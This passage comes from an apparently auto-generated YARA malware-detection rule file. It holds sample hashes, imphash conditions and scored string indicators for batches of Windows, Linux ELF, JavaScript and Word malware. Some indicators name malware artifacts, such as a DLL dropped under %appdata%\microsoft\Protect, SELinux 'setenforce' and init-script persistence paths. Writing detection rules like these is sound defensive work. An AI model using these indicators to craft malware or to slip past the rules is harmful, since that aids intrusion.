      $s3 = "erturkey);var forestgivingerrorsDomain}else{insertBlog</footerlogin.fasteragents<body 10px 0pragmafridayjuniordollarplacedcovers" ascii /* score: '26.00'*/
      $s4 = " severalbecomesselect wedding00.htmlmonarchoff theteacherhighly biologylife ofor evenrise of&raquo;plusonehunting(thoughDouglasj" ascii /* score: '26.00'*/
      $s5 = "font></Norwegianspecifiedproducingpassenger(new DatetemporaryfictionalAfter theequationsdownload.regularlydeveloperabove thelink" ascii /* score: '25.00'*/
      $s6 = "Besides//--></able totargetsessencehim to its by common.mineralto takeways tos.org/ladvisedpenaltysimple:if theyLettersa shortHe" ascii /* score: '25.00'*/
      $s7 = "  attemptpair ofmake itKontaktAntoniohaving ratings activestreamstrapped\").css(hostilelead tolittle groups,Picture-->" fullword ascii /* score: '24.00'*/
      $s8 = "<script type== document.createElemen<a target=\"_blank\" href= document.getElementsBinput type=\"text\" name=a.type = 'text/java" ascii /* score: '23.00'*/
      $s9 = "ondisciplinelogo.png\" (document,boundariesexpressionsettlementBackgroundout of theenterprise(\"https:\" unescape(\"password\" d" ascii /* score: '23.00'*/
      $s10 = " rows=\" objectinverse<footerCustomV><\\/scrsolvingChamberslaverywoundedwhereas!= 'undfor allpartly -right:Arabianbacked century" ascii /* score: '22.00'*/
      $s11 = " the would not befor instanceinvention ofmore complexcollectivelybackground: text-align: its originalinto accountthis processan " ascii /* score: '21.00'*/
      $s12 = "changeresultpublicscreenchoosenormaltravelissuessourcetargetspringmodulemobileswitchphotosborderregionitselfsocialactivecolumnre" ascii /* score: '21.00'*/
      $s13 = "alsereadyaudiotakeswhile.com/livedcasesdailychildgreatjudgethoseunitsneverbroadcoastcoverapplefilescyclesceneplansclickwritequee" ascii /* score: '21.00'*/
      $s14 = "put type=\"hidden\" najs\" type=\"text/javascri(document).ready(functiscript type=\"text/javasimage\" content=\"http://UA-Compat" ascii /* score: '21.00'*/
      $s15 = "online.?xml vehelpingdiamonduse theairlineend -->).attr(readershosting#ffffffrealizeVincentsignals src=\"/Productdespitediverset" ascii /* score: '21.00'*/
   condition:
      ( ( uint16(0) == 0x457f or uint16(0) == 0x5a4d ) and filesize < 29000KB and pe.imphash() == "2ffcc53d165f90cad66a29a16bea365d" and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _0512719a1f878b3611b03d100a854910_imphash__4035d2883e01d64f3e7a9dccb1d63af5_imphash__4035d2883e01d64f3e7a9dccb1d63af5_imphas_17 {
   meta:
      description = "_subset_batch - from files 0512719a1f878b3611b03d100a854910(imphash).exe, 4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, 4035d2883e01d64f3e7a9dccb1d63af5(imphash)_30344db9.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "418ec7ea2b11e518fea98992db9c087d4a38df8b4e9c52b55045d7cd0abdd9ac"
      hash2 = "931651b9bbcb39eca9b48f5a4b733d949248ed09e1d239f9150c336480d9a973"
      hash3 = "30344db9ed508306a213aeae8762cff8789eac9501632c6b35de82586acba07c"
   strings:
      $s1 = "runtime.processorVersionInfo" fullword ascii /* score: '21.00'*/
      $s2 = "runtime.mutexprofilerate" fullword ascii /* score: '21.00'*/
      $s3 = "dwnumberofprocessors" fullword ascii /* score: '19.00'*/
      $s4 = "syscall.procGetCurrentProcess" fullword ascii /* score: '19.00'*/
      $s5 = "syscall.procGetExitCodeProcess" fullword ascii /* score: '19.00'*/
      $s6 = "syscall.procGetCurrentProcessId" fullword ascii /* score: '19.00'*/
      $s7 = "dwactiveprocessormask" fullword ascii /* score: '19.00'*/
      $s8 = "wprocessorlevel" fullword ascii /* score: '19.00'*/
      $s9 = "wprocessorrevision" fullword ascii /* score: '19.00'*/
      $s10 = "dwprocessortype" fullword ascii /* score: '19.00'*/
      $s11 = "syscall.procGetProcessTimes" fullword ascii /* score: '19.00'*/
      $s12 = "runtime.getlasterror" fullword ascii /* score: '18.00'*/
      $s13 = "runtime.printBacklogIndex" fullword ascii /* score: '18.00'*/
      $s14 = "fmt.complexError" fullword ascii /* score: '17.00'*/
      $s15 = "syscall.procOpenProcessToken" fullword ascii /* score: '17.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 11000KB and ( 8 of them )
      ) or ( all of them )
}

rule _00b1ee6cfc8153ec2db1554076bd3db28102dac4e68901c824083bf4d913315d_00b1ee6c_0512719a1f878b3611b03d100a854910_imphash__084fbd9_18 {
   meta:
      description = "_subset_batch - from files 00b1ee6cfc8153ec2db1554076bd3db28102dac4e68901c824083bf4d913315d_00b1ee6c.elf, 0512719a1f878b3611b03d100a854910(imphash).exe, 084fbd94693c1a41c17459784e5691d37dee3ab33379097da0f3a06a4ef484ba_084fbd94.elf, 0f50ae3b7720e4746f66011e6d008da66fe072bdc1d2b436e38425a7b885693b_0f50ae3b.elf, 33a6cb3dc7e952f0062b8511a43a445bb85b3535d89edfc11534d9355f82ec2c_33a6cb3d.elf, 36bf2503a88c8d7798a0751ff12f0126dd48db205109aa42a2b7129317a627ed_36bf2503.elf, 37c14ac6942e05caf18340201ab76c17220d446104349ec45cf00a1a67d2376d_37c14ac6.elf, 37d3842741544d0ed5833a7b726448a1a51617dbf5e9e2f273022eb2a06b8857_37d38427.elf, 3ad87cc8e1672fac36db963bab65fb9d72c255eee04be9a2a4a2b29afb6bff08_3ad87cc8.elf, 4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, 4035d2883e01d64f3e7a9dccb1d63af5(imphash)_30344db9.exe, 416aff537cf06107cccfcbff2b142e2f92d23f7aacc51c0e19a66b92b0797fe7_416aff53.elf, 44c6fbea46ea8d2b1c42d2a77c1af1a64bbc465318ee46edd1322bfe9ee91c48_44c6fbea.elf, 6c5348ed0a55e1c69b6ce05a34879033ae04807f92211eb1fb959b207bb32506_6c5348ed.elf, 6d5f17d7b00a92e39881ac506210c7d6725c92db86942a931e711fb1aede4ce7_6d5f17d7.elf, 7b2f554ded403a23808d09d27913bdf284a96216ef5b35f1affc6a384d80fb1c_7b2f554d.elf, 7de5b038c5ce3d401bf2c8c38ddf7d71dd3af0018a66fe9bc71a35f912e21c02_7de5b038.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "00b1ee6cfc8153ec2db1554076bd3db28102dac4e68901c824083bf4d913315d"
      hash2 = "418ec7ea2b11e518fea98992db9c087d4a38df8b4e9c52b55045d7cd0abdd9ac"
      hash3 = "084fbd94693c1a41c17459784e5691d37dee3ab33379097da0f3a06a4ef484ba"
      hash4 = "0f50ae3b7720e4746f66011e6d008da66fe072bdc1d2b436e38425a7b885693b"
      hash5 = "33a6cb3dc7e952f0062b8511a43a445bb85b3535d89edfc11534d9355f82ec2c"
      hash6 = "36bf2503a88c8d7798a0751ff12f0126dd48db205109aa42a2b7129317a627ed"
      hash7 = "37c14ac6942e05caf18340201ab76c17220d446104349ec45cf00a1a67d2376d"
      hash8 = "37d3842741544d0ed5833a7b726448a1a51617dbf5e9e2f273022eb2a06b8857"
      hash9 = "3ad87cc8e1672fac36db963bab65fb9d72c255eee04be9a2a4a2b29afb6bff08"
      hash10 = "931651b9bbcb39eca9b48f5a4b733d949248ed09e1d239f9150c336480d9a973"
      hash11 = "30344db9ed508306a213aeae8762cff8789eac9501632c6b35de82586acba07c"
      hash12 = "416aff537cf06107cccfcbff2b142e2f92d23f7aacc51c0e19a66b92b0797fe7"
      hash13 = "44c6fbea46ea8d2b1c42d2a77c1af1a64bbc465318ee46edd1322bfe9ee91c48"
      hash14 = "6c5348ed0a55e1c69b6ce05a34879033ae04807f92211eb1fb959b207bb32506"
      hash15 = "6d5f17d7b00a92e39881ac506210c7d6725c92db86942a931e711fb1aede4ce7"
      hash16 = "7b2f554ded403a23808d09d27913bdf284a96216ef5b35f1affc6a384d80fb1c"
      hash17 = "7de5b038c5ce3d401bf2c8c38ddf7d71dd3af0018a66fe9bc71a35f912e21c02"
   strings:
      $s1 = "runtime.getempty" fullword ascii /* score: '22.00'*/
      $s2 = "runtime.execute" fullword ascii /* score: '21.00'*/
      $s3 = "runtime.dumpregs" fullword ascii /* score: '20.00'*/
      $s4 = "runtime.gcDumpObject" fullword ascii /* score: '20.00'*/
      $s5 = "runtime.dumpgstatus" fullword ascii /* score: '20.00'*/
      $s6 = "runtime.injectglist" fullword ascii /* score: '20.00'*/
      $s7 = "*runtime.mutex" fullword ascii /* score: '18.00'*/
      $s8 = "runtime.putempty" fullword ascii /* score: '17.00'*/
      $s9 = "runqhead" fullword ascii /* score: '16.00'*/
      $s10 = "sync.(*Mutex).Unlock" fullword ascii /* score: '15.00'*/
      $s11 = "runtime.sweepone" fullword ascii /* score: '15.00'*/
      $s12 = "sync.(*Mutex).Lock" fullword ascii /* score: '15.00'*/
      $s13 = "*sync.Mutex" fullword ascii /* score: '15.00'*/
      $s14 = "runtime.getitab" fullword ascii /* score: '15.00'*/
      $s15 = "runtime.deductSweepCredit" fullword ascii /* score: '15.00'*/
   condition:
      ( ( uint16(0) == 0x457f or uint16(0) == 0x5a4d ) and filesize < 24000KB and ( 8 of them )
      ) or ( all of them )
}

rule _00b1ee6cfc8153ec2db1554076bd3db28102dac4e68901c824083bf4d913315d_00b1ee6c_084fbd94693c1a41c17459784e5691d37dee3ab33379097da_19 {
   meta:
      description = "_subset_batch - from files 00b1ee6cfc8153ec2db1554076bd3db28102dac4e68901c824083bf4d913315d_00b1ee6c.elf, 084fbd94693c1a41c17459784e5691d37dee3ab33379097da0f3a06a4ef484ba_084fbd94.elf, 0f50ae3b7720e4746f66011e6d008da66fe072bdc1d2b436e38425a7b885693b_0f50ae3b.elf, 33a6cb3dc7e952f0062b8511a43a445bb85b3535d89edfc11534d9355f82ec2c_33a6cb3d.elf, 36bf2503a88c8d7798a0751ff12f0126dd48db205109aa42a2b7129317a627ed_36bf2503.elf, 37c14ac6942e05caf18340201ab76c17220d446104349ec45cf00a1a67d2376d_37c14ac6.elf, 37d3842741544d0ed5833a7b726448a1a51617dbf5e9e2f273022eb2a06b8857_37d38427.elf, 3ad87cc8e1672fac36db963bab65fb9d72c255eee04be9a2a4a2b29afb6bff08_3ad87cc8.elf, 4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, 4035d2883e01d64f3e7a9dccb1d63af5(imphash)_30344db9.exe, 416aff537cf06107cccfcbff2b142e2f92d23f7aacc51c0e19a66b92b0797fe7_416aff53.elf, 44c6fbea46ea8d2b1c42d2a77c1af1a64bbc465318ee46edd1322bfe9ee91c48_44c6fbea.elf, 6c5348ed0a55e1c69b6ce05a34879033ae04807f92211eb1fb959b207bb32506_6c5348ed.elf, 6d5f17d7b00a92e39881ac506210c7d6725c92db86942a931e711fb1aede4ce7_6d5f17d7.elf, 7b2f554ded403a23808d09d27913bdf284a96216ef5b35f1affc6a384d80fb1c_7b2f554d.elf, 7de5b038c5ce3d401bf2c8c38ddf7d71dd3af0018a66fe9bc71a35f912e21c02_7de5b038.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "00b1ee6cfc8153ec2db1554076bd3db28102dac4e68901c824083bf4d913315d"
      hash2 = "084fbd94693c1a41c17459784e5691d37dee3ab33379097da0f3a06a4ef484ba"
      hash3 = "0f50ae3b7720e4746f66011e6d008da66fe072bdc1d2b436e38425a7b885693b"
      hash4 = "33a6cb3dc7e952f0062b8511a43a445bb85b3535d89edfc11534d9355f82ec2c"
      hash5 = "36bf2503a88c8d7798a0751ff12f0126dd48db205109aa42a2b7129317a627ed"
      hash6 = "37c14ac6942e05caf18340201ab76c17220d446104349ec45cf00a1a67d2376d"
      hash7 = "37d3842741544d0ed5833a7b726448a1a51617dbf5e9e2f273022eb2a06b8857"
      hash8 = "3ad87cc8e1672fac36db963bab65fb9d72c255eee04be9a2a4a2b29afb6bff08"
      hash9 = "931651b9bbcb39eca9b48f5a4b733d949248ed09e1d239f9150c336480d9a973"
      hash10 = "30344db9ed508306a213aeae8762cff8789eac9501632c6b35de82586acba07c"
      hash11 = "416aff537cf06107cccfcbff2b142e2f92d23f7aacc51c0e19a66b92b0797fe7"
      hash12 = "44c6fbea46ea8d2b1c42d2a77c1af1a64bbc465318ee46edd1322bfe9ee91c48"
      hash13 = "6c5348ed0a55e1c69b6ce05a34879033ae04807f92211eb1fb959b207bb32506"
      hash14 = "6d5f17d7b00a92e39881ac506210c7d6725c92db86942a931e711fb1aede4ce7"
      hash15 = "7b2f554ded403a23808d09d27913bdf284a96216ef5b35f1affc6a384d80fb1c"
      hash16 = "7de5b038c5ce3d401bf2c8c38ddf7d71dd3af0018a66fe9bc71a35f912e21c02"
   strings:
      $s1 = "runtime.getempty.func1" fullword ascii /* score: '22.00'*/
      $s2 = "runtime.injectglist.func1" fullword ascii /* score: '20.00'*/
      $s3 = "runtime.tracebackHexdump.func1" fullword ascii /* score: '20.00'*/
      $s4 = "runtime.tracebackHexdump" fullword ascii /* score: '20.00'*/
      $s5 = "runtime.hexdumpWords" fullword ascii /* score: '20.00'*/
      $s6 = "runtime.(*rwmutex).runlock" fullword ascii /* score: '18.00'*/
      $s7 = "runtime.envKeyEqual" fullword ascii /* score: '18.00'*/
      $s8 = "runtime.(*rwmutex).rlock" fullword ascii /* score: '18.00'*/
      $s9 = "runtime.(*rwmutex).rlock.func1" fullword ascii /* score: '18.00'*/
      $s10 = "runtime.startTemplateThread" fullword ascii /* score: '17.00'*/
      $s11 = "runtime.templateThread" fullword ascii /* score: '17.00'*/
      $s12 = "runtime.errorAddressString.Error" fullword ascii /* score: '16.00'*/
      $s13 = "runtime.globrunqputhead" fullword ascii /* score: '15.00'*/
      $s14 = "internal/poll.(*fdMutex).decref" fullword ascii /* score: '15.00'*/
      $s15 = "*poll.fdMutex" fullword ascii /* score: '15.00'*/
   condition:
      ( ( uint16(0) == 0x457f or uint16(0) == 0x5a4d ) and filesize < 24000KB and pe.imphash() == "4035d2883e01d64f3e7a9dccb1d63af5" and ( 8 of them )
      ) or ( all of them )
}

rule _2418dd6101aab6b8b66094ca5d0d7099eecc293758fe4a57a2c512cc9ff90d0f_2418dd61_324b5e30d878d7adb556a1b355ce6b201e8b9547e0991161e_20 {
   meta:
      description = "_subset_batch - from files 2418dd6101aab6b8b66094ca5d0d7099eecc293758fe4a57a2c512cc9ff90d0f_2418dd61.js, 324b5e30d878d7adb556a1b355ce6b201e8b9547e0991161e6ba2d1e029f6f9b_324b5e30.js, 3f2899a4cee9f68f8ec8ac900e06e22b5a5af4acf1366dbed93157bf86b3c40b_3f2899a4.js, 3fabbc65a540404c1e7481af04d5930f3cd90b51f1db452ffe5a110d5fca6a34_3fabbc65.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "2418dd6101aab6b8b66094ca5d0d7099eecc293758fe4a57a2c512cc9ff90d0f"
      hash2 = "324b5e30d878d7adb556a1b355ce6b201e8b9547e0991161e6ba2d1e029f6f9b"
      hash3 = "3f2899a4cee9f68f8ec8ac900e06e22b5a5af4acf1366dbed93157bf86b3c40b"
      hash4 = "3fabbc65a540404c1e7481af04d5930f3cd90b51f1db452ffe5a110d5fca6a34"
   strings:
      $s1 = "iframe.src=\"javascript:\";" fullword ascii /* score: '25.00'*/
      $s2 = "var compliantExecNpcg=/()??/.exec(\"\")[1]===void 0;" fullword ascii /* score: '23.00'*/
      $s3 = "descriptor.get=getter;" fullword ascii /* score: '21.00'*/
      $s4 = "if(!compliantExecNpcg&&match.length>1){" fullword ascii /* score: '19.00'*/
      $s5 = "if(!compliantExecNpcg){" fullword ascii /* score: '19.00'*/
      $s6 = "Object.getOwnPropertyDescriptor=function(object,property){" fullword ascii /* score: '18.00'*/
      $s7 = "defineGetter(object,property,descriptor.get);" fullword ascii /* score: '18.00'*/
      $s8 = "Empty.prototype=target.prototype;" fullword ascii /* score: '17.00'*/
      $s9 = "throw new TypeError(ERR_NON_OBJECT_TARGET+object);" fullword ascii /* score: '17.00'*/
      $s10 = "var boundLength=Math.max(0,target.length-args.length);" fullword ascii /* score: '17.00'*/
      $s11 = "descriptor.set=setter;" fullword ascii /* score: '16.00'*/
      $s12 = "var match=isoDateExpression.exec(string);" fullword ascii /* score: '16.00'*/
      $s13 = "while(match=separator.exec(string)){" fullword ascii /* score: '16.00'*/
      $s14 = "throw new TypeError(\"Function.prototype.bind called on incompatible \"+target);" fullword ascii /* score: '16.00'*/
      $s15 = "if(owns(descriptor,\"get\")){" fullword ascii /* score: '15.00'*/
   condition:
      ( ( uint16(0) == 0x0a0d or uint16(0) == 0x2a2f ) and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _20987f7163c8fe466930ece075cd051273530dfcbe8893600fd21fcfb58b5b08_20987f71_57253f322504e0a8256d46f31c19e228b8c55a14ee18e7599_21 {
   meta:
      description = "_subset_batch - from files 20987f7163c8fe466930ece075cd051273530dfcbe8893600fd21fcfb58b5b08_20987f71.doc, 57253f322504e0a8256d46f31c19e228b8c55a14ee18e759936c71941c8ee4ad_57253f32.doc"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "20987f7163c8fe466930ece075cd051273530dfcbe8893600fd21fcfb58b5b08"
      hash2 = "57253f322504e0a8256d46f31c19e228b8c55a14ee18e759936c71941c8ee4ad"
   strings:
      $x1 = "%appdata%\\microsoft\\Protect\\altio32.dll" fullword wide /* score: '34.00'*/
      $x2 = "prnfldr.dll" fullword ascii /* reversed goodware string 'lld.rdlfnrp' */ /* score: '33.00'*/
      $s3 = "*\\G{2DF8D04C-5BFA-101B-BDE5-00AA0044DE52}#2.8#0#C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\OFFICE16\\MSO.DLL#Micr" wide /* score: '28.00'*/
      $s4 = "*\\G{000204EF-0000-0000-C000-000000000046}#4.2#9#C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\VBA\\VBA7.1\\VBE7.DLL#" wide /* score: '24.00'*/
      $s5 = "altio32.dll" fullword wide /* score: '23.00'*/
      $s6 = "tmsnrb41da2y867.tmp" fullword wide /* score: '17.00'*/
      $s7 = "*\\G{00020905-0000-0000-C000-000000000046}#8.7#0#C:\\Program Files (x86)\\Microsoft Office\\Root\\Office16\\MSWORD.OLB#Microsoft" wide /* score: '16.00'*/
      $s8 = "line.xsl\" StyleName=\"APA\" Version=\"6\"></b:Sources>" fullword ascii /* score: '13.00'*/
      $s9 = "advapi3 2.dllfcRe" fullword ascii /* score: '13.00'*/
      $s10 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?><b:Sources xmlns:b=\"http://schemas.openxmlformats.org/officeDocumen" ascii /* score: '10.00'*/
      $s11 = "<ds:datastoreItem ds:itemID=\"{F588D8B2-11DE-448E-A912-BF5F67254220}\" xmlns:ds=\"http://schemas.openxmlformats.org/officeDocume" ascii /* score: '10.00'*/
      $s12 = "View.Typ" fullword ascii /* score: '10.00'*/
      $s13 = "<ds:datastoreItem ds:itemID=\"{F588D8B2-11DE-448E-A912-BF5F67254220}\" xmlns:ds=\"http://schemas.openxmlformats.org/officeDocume" ascii /* score: '10.00'*/
      $s14 = "ters.Cou" fullword ascii /* score: '10.00'*/
      $s15 = "bibliography\" xmlns=\"http://schemas.openxmlformats.org/officeDocument/2006/bibliography\" SelectedStyle=\"\\APASixthEditionOff" ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 2000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _00b1ee6cfc8153ec2db1554076bd3db28102dac4e68901c824083bf4d913315d_00b1ee6c_0512719a1f878b3611b03d100a854910_imphash__084fbd9_22 {
   meta:
      description = "_subset_batch - from files 00b1ee6cfc8153ec2db1554076bd3db28102dac4e68901c824083bf4d913315d_00b1ee6c.elf, 0512719a1f878b3611b03d100a854910(imphash).exe, 084fbd94693c1a41c17459784e5691d37dee3ab33379097da0f3a06a4ef484ba_084fbd94.elf, 0f50ae3b7720e4746f66011e6d008da66fe072bdc1d2b436e38425a7b885693b_0f50ae3b.elf, 33a6cb3dc7e952f0062b8511a43a445bb85b3535d89edfc11534d9355f82ec2c_33a6cb3d.elf, 36bf2503a88c8d7798a0751ff12f0126dd48db205109aa42a2b7129317a627ed_36bf2503.elf, 37c14ac6942e05caf18340201ab76c17220d446104349ec45cf00a1a67d2376d_37c14ac6.elf, 37d3842741544d0ed5833a7b726448a1a51617dbf5e9e2f273022eb2a06b8857_37d38427.elf, 3ad87cc8e1672fac36db963bab65fb9d72c255eee04be9a2a4a2b29afb6bff08_3ad87cc8.elf, 416aff537cf06107cccfcbff2b142e2f92d23f7aacc51c0e19a66b92b0797fe7_416aff53.elf, 44c6fbea46ea8d2b1c42d2a77c1af1a64bbc465318ee46edd1322bfe9ee91c48_44c6fbea.elf, 6c5348ed0a55e1c69b6ce05a34879033ae04807f92211eb1fb959b207bb32506_6c5348ed.elf, 6d5f17d7b00a92e39881ac506210c7d6725c92db86942a931e711fb1aede4ce7_6d5f17d7.elf, 7b2f554ded403a23808d09d27913bdf284a96216ef5b35f1affc6a384d80fb1c_7b2f554d.elf, 7de5b038c5ce3d401bf2c8c38ddf7d71dd3af0018a66fe9bc71a35f912e21c02_7de5b038.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "00b1ee6cfc8153ec2db1554076bd3db28102dac4e68901c824083bf4d913315d"
      hash2 = "418ec7ea2b11e518fea98992db9c087d4a38df8b4e9c52b55045d7cd0abdd9ac"
      hash3 = "084fbd94693c1a41c17459784e5691d37dee3ab33379097da0f3a06a4ef484ba"
      hash4 = "0f50ae3b7720e4746f66011e6d008da66fe072bdc1d2b436e38425a7b885693b"
      hash5 = "33a6cb3dc7e952f0062b8511a43a445bb85b3535d89edfc11534d9355f82ec2c"
      hash6 = "36bf2503a88c8d7798a0751ff12f0126dd48db205109aa42a2b7129317a627ed"
      hash7 = "37c14ac6942e05caf18340201ab76c17220d446104349ec45cf00a1a67d2376d"
      hash8 = "37d3842741544d0ed5833a7b726448a1a51617dbf5e9e2f273022eb2a06b8857"
      hash9 = "3ad87cc8e1672fac36db963bab65fb9d72c255eee04be9a2a4a2b29afb6bff08"
      hash10 = "416aff537cf06107cccfcbff2b142e2f92d23f7aacc51c0e19a66b92b0797fe7"
      hash11 = "44c6fbea46ea8d2b1c42d2a77c1af1a64bbc465318ee46edd1322bfe9ee91c48"
      hash12 = "6c5348ed0a55e1c69b6ce05a34879033ae04807f92211eb1fb959b207bb32506"
      hash13 = "6d5f17d7b00a92e39881ac506210c7d6725c92db86942a931e711fb1aede4ce7"
      hash14 = "7b2f554ded403a23808d09d27913bdf284a96216ef5b35f1affc6a384d80fb1c"
      hash15 = "7de5b038c5ce3d401bf2c8c38ddf7d71dd3af0018a66fe9bc71a35f912e21c02"
   strings:
      $s1 = "math.Log" fullword ascii /* score: '19.00'*/
      $s2 = "sync.(*RWMutex).RUnlock" fullword ascii /* score: '18.00'*/
      $s3 = "context.deadlineExceededError.Temporary" fullword ascii /* score: '17.00'*/
      $s4 = "net.UnknownNetworkError.Temporary" fullword ascii /* score: '17.00'*/
      $s5 = "sync.(*RWMutex).Unlock" fullword ascii /* score: '15.00'*/
      $s6 = "net.JoinHostPort" fullword ascii /* score: '15.00'*/
      $s7 = "sync.(*RWMutex).Lock" fullword ascii /* score: '15.00'*/
      $s8 = "*sync.RWMutex" fullword ascii /* score: '15.00'*/
      $s9 = "net.listenerBacklog" fullword ascii /* score: '15.00'*/
      $s10 = "*log.Logger" fullword ascii /* score: '15.00'*/
      $s11 = "net.SplitHostPort" fullword ascii /* score: '15.00'*/
      $s12 = "net.maxListenerBacklog" fullword ascii /* score: '15.00'*/
      $s13 = "sync.(*RWMutex).RLock" fullword ascii /* score: '15.00'*/
      $s14 = "net.SplitHostPort.func1" fullword ascii /* score: '15.00'*/
      $s15 = "reflect.StructTag.Get" fullword ascii /* score: '15.00'*/
   condition:
      ( ( uint16(0) == 0x457f or uint16(0) == 0x5a4d ) and filesize < 24000KB and pe.imphash() == "0512719a1f878b3611b03d100a854910" and ( 8 of them )
      ) or ( all of them )
}

rule _36bf2503a88c8d7798a0751ff12f0126dd48db205109aa42a2b7129317a627ed_36bf2503_44c6fbea46ea8d2b1c42d2a77c1af1a64bbc465318ee46edd_23 {
   meta:
      description = "_subset_batch - from files 36bf2503a88c8d7798a0751ff12f0126dd48db205109aa42a2b7129317a627ed_36bf2503.elf, 44c6fbea46ea8d2b1c42d2a77c1af1a64bbc465318ee46edd1322bfe9ee91c48_44c6fbea.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "36bf2503a88c8d7798a0751ff12f0126dd48db205109aa42a2b7129317a627ed"
      hash2 = "44c6fbea46ea8d2b1c42d2a77c1af1a64bbc465318ee46edd1322bfe9ee91c48"
   strings:
      $x1 = "unsafe.String: len out of rangereflect: Len of non-array type reflect.MakeSlice: negative lenreflect.MakeSlice: negative capenco" ascii /* score: '67.50'*/
      $x2 = " [failed to parse Location header %q: %vnet/http: invalid header field name %qtls: invalid ServerKeyExchange messageexpected an " ascii /* score: '66.50'*/
      $x3 = "lock: lock countbad system huge page sizearena already initialized to unused region of spanunaligned sysNoHugePageOS/sched/gomax" ascii /* score: '65.50'*/
      $x4 = "sched={pc:, gp->status= pluginpath= : unknown pc  called from  in host nameSHA256-RSAPSSSHA384-RSAPSSSHA512-RSAPSStrailing dataS" ascii /* score: '47.00'*/
      $x5 = "net/url: invalid control character in URLcan't call pointer on a non-pointer Valuereflect.Value.Addr of unaddressable valueMapIt" ascii /* score: '41.50'*/
      $x6 = "http: nil Request.URLUNKNOWN_FRAME_TYPE_%dframe_ping_has_streamnet/http: nil ContextPrecondition RequiredInternal Server Errorde" ascii /* score: '40.00'*/
      $x7 = "mstartm not found in allmstopm holding lockssemaRoot rotateLeftbad notifyList sizeruntime: preempt g0runtime: pcdata is dodeltim" ascii /* score: '39.00'*/
      $x8 = " runqueue= stopwait= runqsize= gfreecnt= throwing= spinning=atomicand8float64nanfloat32nan ptrSize=  targetpc= until pc=unknown " ascii /* score: '35.50'*/
      $x9 = "/etc/init.d/boot.localIPv6: no supported yethttp2: frame too largewrite on closed bufferframe_data_pad_too_bigaccess-control-max" ascii /* score: '32.00'*/
      $x10 = "nvalid authority info accessinvalid utf8 payload in close framehpack: invalid Huffman-encoded datadynamic table size update too " ascii /* score: '31.00'*/
      $x11 = "morebuf={pc:: no frame (sp=runtime: frame runtimer: bad ptraceback stuckinvalid argSize<invalid Value>data before FINbad close c" ascii /* score: '31.00'*/
      $s12 = "vel 2 haltedprotocol errortoo many userswindow changed: extra text: .WithDeadline(<not Stringer> (core dumped)unexpected EOF/etc" ascii /* score: '29.00'*/
      $s13 = "BigEndianrwxrwxrwxd.nx != 0pclmulqdqunderflowTRANSFORMPADDING_1PADDING_2InheritedquestionsClassINETAuthoritymath/randUser-Agent/" ascii /* score: '29.00'*/
      $s14 = ".ffff4444setenforcesystem.pubgateway.shdial dst: 8.8.8.8:53 stream=%dset-cookieuser-agentConnectionkeep-alive:authorityconnectio" ascii /* score: '28.00'*/
      $s15 = "sed by  pcHeader.textStart= timer data corruptionexec: already startedreflect.Value.Complex of unexported methodunexpected value" ascii /* score: '27.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 15000KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _1dbc7738d8ad1e6b79048c0e4a9066ae_imphash__6d4ab1032f66fc4fe8d72b1c468e1469_imphash__24 {
   meta:
      description = "_subset_batch - from files 1dbc7738d8ad1e6b79048c0e4a9066ae(imphash).exe, 6d4ab1032f66fc4fe8d72b1c468e1469(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "fb488e45a6338697d70301557cad14b110880f6838023b44d0125759123c4449"
      hash2 = "ecb3a597d17244e2fadec4590a6b492f362095ffc5eb6ee58624be766c69fc82"
   strings:
      $s1 = "System.Collections.Generic.IEnumerator<System.Runtime.Loader.LibraryNameVariation>.get_Current@" fullword ascii /* score: '24.00'*/
      $s2 = "nicu.dll" fullword wide /* score: '23.00'*/
      $s3 = "2GetRuntimeTypeBypassCache" fullword ascii /* score: '19.00'*/
      $s4 = ".TargetPlatformAttribute8SupportedOSPlatformAttributeg" fullword ascii /* score: '17.00'*/
      $s5 = "RehydrateTarget@" fullword ascii /* score: '14.00'*/
      $s6 = "2TypeLoaderExceptionHelper" fullword ascii /* score: '13.00'*/
      $s7 = "System.Resources.UseSystemResourceKey" fullword wide /* score: '13.00'*/
      $s8 = "`ReflectionExecutionDomainCallbacksImplementation" fullword ascii /* score: '12.00'*/
      $s9 = "HDefaultDllImportSearchPathsAttributeg" fullword ascii /* score: '12.00'*/
      $s10 = ",IComparisonOperators`3" fullword ascii /* score: '12.00'*/
      $s11 = "GetHashCode@" fullword ascii /* score: '12.00'*/
      $s12 = "RhGetThunkSize2RhGetRuntimeHelperForType" fullword ascii /* score: '12.00'*/
      $s13 = "OverlappedData4OnExecutionContextCallback" fullword ascii /* score: '12.00'*/
      $s14 = "&DllImportSearchPath" fullword ascii /* score: '12.00'*/
      $s15 = "&GetSystemDirectoryW" fullword ascii /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 8000KB and ( 8 of them )
      ) or ( all of them )
}

rule _27ac6e0b23c27dbcd34d1f47a5139e4a503573557d0dcfb550ffcc5d4d642682_27ac6e0b_5ef16927424d3a1772afd5f9de585b4c7e42e51d6254b8da0_25 {
   meta:
